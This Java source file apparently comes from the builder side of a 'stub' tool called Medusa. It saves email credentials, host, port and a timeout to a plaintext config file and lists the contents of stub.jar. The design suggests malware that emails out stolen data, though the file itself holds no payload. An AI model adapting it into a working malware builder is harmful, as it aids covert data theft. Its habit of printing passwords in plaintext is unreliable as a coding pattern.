package net.lotusdev.medusa.client;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

/**
 * Builder.java
 * @author Jabaar
 *
 */

public class Builder {
	public static File curDir = new File(System.getProperty("user.dir"), "config.dat");
	public static String eUser;
	public static String ePass;
	public static String eHost;
	public static String ePort;
	public static int timeout;
	public static ArrayList<Object> getClasses = new ArrayList<Object>();
	
	public static void makeConfig() {
		try {			
			if(!curDir.exists()) {
				curDir.createNewFile();
			}else {
				
			}
		}catch(IOException e) {
			e.printStackTrace();
		}
	}
	
	public static File getConfig() {
		return curDir;
	}
	
	public static void writeConfig() {
		try {
			/**
			 * Writes user set data to config file.
			 */
			if(curDir.exists()) {
				BufferedWriter out = new BufferedWriter(new FileWriter(curDir));
				out.write("#DO NOT MODIFY THIS FILE.");
				out.write("\r\neUser:" + getEmailUser());
				out.write("\r\nePass:" + getEmailPass());
				out.write("\r\neHost:" + getEmailHost());
				out.write("\r\nePort:" + getEmailPort());
				out.write("\r\ntimeout:" + getTimeout());
				out.close();
				
				System.out.println(getEmailUser() + " | " + getEmailPass() + " | " + getEmailHost() + " | " + getEmailPort() + " | " + getTimeout());
			}else {
				curDir.createNewFile();
			}
		}catch(Exception e) {
			
		}
	}
	
	public static void readConfig() {
		try {
			if(curDir.exists()) {
				BufferedReader in = new BufferedReader(new FileReader(curDir));
				String inLine; 
				for(; (inLine = in.readLine()) != null;) {
					String[] parseVar = inLine.split(":");
					if(parseVar[0].startsWith("eUser"))
                		setEmailUser(parseVar[1]);
                	else if(parseVar[0].startsWith("ePass"))
                		setEmailPass(parseVar[1]);
                	else if(parseVar[0].startsWith("eHost"))
                		setEmailHost(parseVar[1]);
                	else if(parseVar[0].startsWith("ePort"))
                		setEmailPort(parseVar[1]);
                	else if(parseVar[0].startsWith("timeout"))
                		setTimeout(Integer.parseInt(parseVar[1]));
                	
    				System.out.println(getEmailUser() + " | " + getEmailPass() + " | " + getEmailHost() + " | " + getEmailPort() + " | " + getTimeout());
                }
				in.close();
			}else {
				curDir.createNewFile();
			}
		}catch(Exception e) {
			
		}
	}
	
	public static void build() {
		try {
			File temp = File.createTempFile("l_stb_tmp", ".jar");
			
			JarFile jarFile = new JarFile("stub.jar");
			
			Enumeration j = jarFile.entries();
			while(j.hasMoreElements())
				process(j.nextElement());
			
			JarEntry entry = jarFile.getJarEntry("config.dat");
		    InputStream input = jarFile.getInputStream(entry);
		    process1(input);
		    
		    System.out.println(curDir);
		}catch(Exception e) {
			
		}
	}
	
	public static void getEstimateClasses() {
		try {			
			JarFile jarFile = new JarFile("stub.jar");
			
			Enumeration j = jarFile.entries();
			while(j.hasMoreElements())
				process(j.nextElement());
			
			JarEntry entry = jarFile.getJarEntry("config.dat");
		    InputStream input = jarFile.getInputStream(entry);
		    process1(input);
		}catch(Exception e) {
			
		}
	}
	
	public static void process(Object obj) {
	    JarEntry entry = (JarEntry)obj;
	    String name = entry.getName();
	    long size = entry.getSize();
	    long compressedSize = entry.getCompressedSize();
	    System.out.println(name + "\t" + size + "\t" + compressedSize);
	    getClasses.add(name);
    }
	
	private static void process1(InputStream input) {
		try {
		    InputStreamReader isr = new InputStreamReader(input);
		    BufferedReader reader = new BufferedReader(isr);
		    String line;
		    while ((line = reader.readLine()) != null)
		    System.out.println(line);
		    reader.close();
		}catch(Exception e) {
			
		}
    }
	
	/**
	 * Getters and setters for main input and output variables.
	 */
	public static void setEmailUser(String eUser) {
		Builder.eUser = eUser;
	}
	
	public static void setEmailPass(String ePass) {
		Builder.ePass = ePass;
	}
	
	public static void setEmailHost(String eHost) {
		Builder.eHost = eHost;
	}
	
	public static void setEmailPort(String ePort) {
		Builder.ePort = ePort;
	}
		
	public static void setTimeout(int timeout) {
		/**
		 * Set the timeout to a int and multiply by 60 to get minute value.
		 */
		Builder.timeout = timeout;
	}
	
	public static String getEmailUser() {
		return eUser;
	}
	
	public static String getEmailPass() {
		return ePass;
	}
	
	public static String getEmailHost() {
		return eHost;
	}
	
	public static String getEmailPort() {
		return ePort;
	}
	
	public static int getTimeout() {
		return timeout;
	}
}
